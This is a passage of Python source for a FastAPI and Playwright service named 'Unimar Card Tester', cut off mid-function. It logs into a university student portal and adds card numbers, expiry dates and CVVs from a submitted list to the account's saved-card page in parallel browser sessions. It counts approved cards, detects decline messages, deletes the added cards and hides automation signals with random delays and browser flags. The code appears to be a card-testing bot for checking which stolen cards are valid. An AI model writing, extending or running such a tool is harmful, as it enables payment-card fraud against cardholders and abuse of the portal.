import os
import time
import asyncio
import subprocess
import random
import datetime
import logging
from pathlib import Path
from typing import Set, Optional
from contextlib import asynccontextmanager

from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel, field_validator
from playwright.async_api import async_playwright
import uvicorn

# ================= CONFIG =================
PORT = int(os.getenv("PORT", "8000"))

URL_LOGIN = os.getenv("UNIMAR_URL_LOGIN", "https://digital.unimar.br/login/app")
URL_MEUS_CARTOES = os.getenv("UNIMAR_URL_CARTOES", "https://digital.unimar.br/areadoaluno/conta/meuscartoes")
EMAIL = os.getenv("UNIMAR_EMAIL", "")
SENHA = os.getenv("UNIMAR_SENHA", "")
NOME_FIXO = os.getenv("UNIMAR_NOME", "")
MAX_TENTATIVAS = int(os.getenv("UNIMAR_MAX_TENTATIVAS", "3"))
MAX_CANAIS = int(os.getenv("UNIMAR_MAX_CANAIS", "6"))

VIEWPORT = {"width": 1280, "height": 720}
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
BROWSER_ARGS = [
    "--no-sandbox",
    "--disable-dev-shm-usage",
    "--disable-gpu",
    "--disable-web-security",
    "--disable-features=IsolateOrigins,site-per-process",
    "--disable-blink-features=AutomationControlled",
    "--disable-setuid-sandbox",
]

SESSAO_PATH = Path("sessao_unimar.json")
SESSAO_MAX_AGE = 86400

# ================= LOGGING =================
logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(levelname)s %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("unimar")

# ================= PLAYWRIGHT =================
def garantir_playwright() -> bool:
    ms_playwright = Path("/root/.cache/ms-playwright")
    if ms_playwright.exists():
        for pasta in ms_playwright.iterdir():
            if pasta.is_dir() and pasta.name.startswith("chromium-"):
                chrome = pasta / "chrome-linux" / "chrome"
                if chrome.exists():
                    logger.info("Chromium encontrado: %s", chrome)
                    return True
    logger.warning("Chromium não encontrado. Instalando...")
    try:
        subprocess.run(["playwright", "install", "chromium"], check=True, timeout=120)
        return True
    except Exception:
        logger.exception("Erro ao instalar Chromium")
        return False

# ================= ESTADO =================
class Estado:
    def __init__(self):
        self.lock = asyncio.Lock()
        self.rodando = False
        self.cancelado = False
        self.clients: Set[WebSocket] = set()
        self.total_cartoes = 0
        self.tarefas_concluidas = 0
        self.aprovados = 0
        self.inicio_timestamp = 0.0
        self.canais_ativos = 0
        self.task: Optional[asyncio.Task] = None

estado = Estado()

# ================= HELPERS =================

async def set_estado(**kwargs) -> None:
    async with estado.lock:
        for k, v in kwargs.items():
            setattr(estado, k, v)

async def inc_estado(campo: str, valor: int = 1) -> int:
    async with estado.lock:
        atual = getattr(estado, campo)
        novo = atual + valor
        setattr(estado, campo, novo)
        return novo

async def calc_velocidade() -> tuple[float, int]:
    async with estado.lock:
        inicio = estado.inicio_timestamp
        concluidas = estado.tarefas_concluidas
    elapsed = time.time() - inicio if inicio else 0
    velocidade = concluidas / (elapsed / 60) if elapsed > 0 else 0
    return round(velocidade, 1), round(elapsed)

async def broadcast(app: FastAPI, tipo: str, data: dict | None = None) -> None:
    if data is None:
        data = {}
    mensagem = {"type": tipo, **data}
    async with estado.lock:
        clients = list(estado.clients)

    tarefas = [client.send_json(mensagem) for client in clients]
    resultados = await asyncio.gather(*tarefas, return_exceptions=True)

    mortos = [c for c, r in zip(clients, resultados) if isinstance(r, Exception)]
    if mortos:
        async with estado.lock:
            for c in mortos:
                estado.clients.discard(c)

    logger.info("Broadcast %s enviado para %d cliente(s)", tipo, len(clients) - len(mortos))

def _log_task_exception(task: asyncio.Task) -> None:
    if task.cancelled():
        return
    exc = task.exception()
    if exc:
        logger.error("Erro no broadcast de log: %s", exc)

def log(app: FastAPI, msg: str) -> None:
    timestamp = time.strftime("%H:%M:%S")
    full = f"[{timestamp}] {msg}"
    logger.info(msg)
    try:
        loop = asyncio.get_running_loop()
        task = loop.create_task(broadcast(app, "log", {"mensagem": full}))
        task.add_done_callback(_log_task_exception)
    except RuntimeError:
        pass

# ================= SCHEMAS =================
class IniciarRequest(BaseModel):
    lista: str
    canais: int = 4

    @field_validator("canais")
    @classmethod
    def validar_canais(cls, v):
        if v < 1 or v > MAX_CANAIS:
            raise ValueError(f"Canais deve ser entre 1 e {MAX_CANAIS}")
        return v

# ================= WEBSOCKET KEEPALIVE =================
async def _ws_keepalive():
    """Envia ping a cada 30s para manter conexões WebSocket vivas."""
    while True:
        await asyncio.sleep(30)
        async with estado.lock:
            clients = list(estado.clients)
        for client in clients:
            try:
                await client.send_json({"type": "ping"})
            except Exception:
                async with estado.lock:
                    estado.clients.discard(client)

# ================= FASTAPI =================
@asynccontextmanager
async def lifespan(app: FastAPI):
    app.state.playwright_ok = await asyncio.to_thread(garantir_playwright)
    app.state.job_task = None
    app.state.browser = None
    keepalive_task = asyncio.create_task(_ws_keepalive())
    yield
    keepalive_task.cancel()
    try:
        await keepalive_task
    except asyncio.CancelledError:
        pass
    if estado.task and not estado.task.done():
        estado.cancelado = True
        estado.rodando = False
        estado.task.cancel()
        try:
            await estado.task
        except Exception:
            pass

app = FastAPI(title="Unimar Card Tester", lifespan=lifespan)

# ================= PLAYWRIGHT FLOWS =================
async def sessao_valida(playwright) -> bool:
    if not SESSAO_PATH.exists():
        return False
    if time.time() - SESSAO_PATH.stat().st_mtime > SESSAO_MAX_AGE:
        return False
    try:
        browser = await playwright.chromium.launch(headless=True, args=BROWSER_ARGS)
        context = await browser.new_context(
            storage_state=str(SESSAO_PATH),
            viewport=VIEWPORT,
            user_agent=USER_AGENT,
        )
        page = await context.new_page()
        await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=15000)
        await asyncio.sleep(0.8)
        ok = await page.get_by_role("button", name="Adicionar Cartão de Crédito").count() > 0
        await context.close()
        await browser.close()
        return ok
    except Exception:
        logger.exception("Erro ao validar sessão")
        return False

async def limpar_cartoes(page, app: FastAPI) -> None:
    try:
        log(app, "[Faxina] Iniciando limpeza...")
        await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)
        await asyncio.sleep(1.2)
        removidos = 0

        for _ in range(50):
            if estado.cancelado:
                break

            botoes = page.get_by_role("button", name="Remover")
            if await botoes.count() == 0:
                break

            try:
                await botoes.first.click(force=True, timeout=5000)
                await asyncio.sleep(0.5)
                removidos += 1
            except Exception:
                break

        log(app, f"[Faxina] {removidos} removidos")
    except Exception:
        logger.exception("[Faxina] Erro")

async def login_mestre(playwright, app: FastAPI) -> bool:
    try:
        if await sessao_valida(playwright):
            log(app, "[Auth] Sessão reutilizada (Modo Fast)")
            return True

        if not EMAIL or not SENHA:
            log(app, "[ERRO] Email/senha não configurados!")
            return False

        log(app, "[Auth] Login completo (Modo Full)...")
        browser = await playwright.chromium.launch(headless=True, args=BROWSER_ARGS)
        context = await browser.new_context(viewport=VIEWPORT, user_agent=USER_AGENT)
        page = await context.new_page()
        page.on("dialog", lambda d: asyncio.create_task(d.accept()))

        await page.goto(URL_LOGIN, wait_until="domcontentloaded", timeout=60000)
        await asyncio.sleep(3)

        # Varredura dinâmica de frames e inputs idêntica ao testar_login.py
        alvo_page = page
        for frame in page.frames:
            inputs = await frame.locator("input").all()
            if len(inputs) > 0:
                for inp in inputs:
                    placeholder = await inp.get_attribute("placeholder")
                    if placeholder and "E-mail" in placeholder:
                        alvo_page = frame
                        break

        try:
            email_input = alvo_page.locator("input[type='email'], input[type='text'], input:not([type])").first
            await email_input.click()
            await email_input.fill(EMAIL)

            senha_input = alvo_page.locator("input[type='password']").first
            await senha_input.click()
            await senha_input.fill(SENHA)

            btn = alvo_page.locator("button, input[type='submit']").filter(has_text="ENTRAR").first
            if not await btn.count():
                btn = alvo_page.locator("button[type='submit']").first
            await btn.click()
        except Exception:
            logger.exception("Não foi possível preencher ou clicar nos campos de login")
            raise

        try:
            await page.wait_for_selector("text=Meus Cartões", timeout=30000)
        except Exception:
            await page.screenshot(path="erro_login.png", full_page=True)
            log(app, "[ERRO] Login não concluiu a tempo. Print salvo em 'erro_login.png'.")
            raise

        await limpar_cartoes(page, app)
        await context.storage_state(path=str(SESSAO_PATH))
        await context.close()
        await browser.close()

        log(app, "[Auth] Login concluído!")
        return True
    except Exception:
        logger.exception("[ERRO] Login falhou")
        return False

# ================= VALIDAÇÃO =================
def validar_luhn(numero: str) -> bool:
    """Valida número de cartão pelo algoritmo de Luhn."""
    digits = [int(d) for d in numero if d.isdigit()]
    if len(digits) < 13 or len(digits) > 19:
        return False
    checksum = 0
    for i, d in enumerate(reversed(digits)):
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        checksum += d
    return checksum % 10 == 0

def validar_cartao(numero: str, mes: str, ano: str, cvv: str) -> str | None:
    """Retorna mensagem de erro ou None se válido."""
    if not numero.isdigit() or not validar_luhn(numero):
        return "Número inválido (Luhn)"
    if not mes.isdigit() or not (1 <= int(mes) <= 12):
        return "Mês inválido"
    if not ano.isdigit() or int(ano) < datetime.datetime.now().year:
        return "Ano expirado"
    if not cvv.isdigit() or len(cvv) not in (3, 4):
        return "CVV inválido"
    return None

_ERRO_KEYWORDS = [
    "inválida", "recusado", "erro", "não foi possível", "inválido",
    "declined", "invalid", "refused", "failed", "falhou",
    "cartão não", "tente novamente", "não autorizado", "negado",
]

async def processar_cartao(page, numero: str, mes: str, ano: str, cvv: str) -> str:
    _TIMEOUT = 15000  # ms por ação individual

    try:
        await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)
        await asyncio.sleep(random.uniform(0.4, 1.0))

        url_atual = page.url
        if "login" in url_atual.lower() or URL_MEUS_CARTOES not in url_atual:
            logger.warning("Sessão expirada! URL atual: %s", url_atual)
            return "erro:sessao_expirada"

        btn_adicionar = page.get_by_role("button", name="Adicionar Cartão de Crédito")
        if not await btn_adicionar.count():
            return "erro:botao_adicionar_nao_encontrado"
        await btn_adicionar.click(force=True, timeout=_TIMEOUT)
        await asyncio.sleep(0.5)

        try:
            await page.get_by_role("textbox", name="Número do cartão").fill(numero, timeout
